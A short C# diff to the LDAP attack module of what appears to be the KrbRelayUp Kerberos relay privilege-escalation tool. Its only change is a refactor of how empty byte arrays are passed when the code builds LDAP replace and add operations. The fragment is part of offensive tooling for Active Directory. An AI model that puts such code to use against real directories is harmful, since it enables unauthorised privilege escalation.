@@ -47,7 +47,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
                 value
             };
             var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? new byte[0]).ToArray(), modValuePtr);
+            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
             List<LDAPMod> mod = new List<LDAPMod> {
                 new LDAPMod {
                     mod_op = (int)LdapModOperation.LDAP_MOD_REPLACE | (int)LdapModOperation.LDAP_MOD_BVALUES,
@@ -101,7 +101,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
                 value
             };
             var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? new byte[0]).ToArray(), modValuePtr);
+            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
             List<LDAPMod> mod = new List<LDAPMod> {
                 new LDAPMod {
                     mod_op = (int)LdapModOperation.LDAP_MOD_ADD | (int)LdapModOperation.LDAP_MOD_BVALUES,
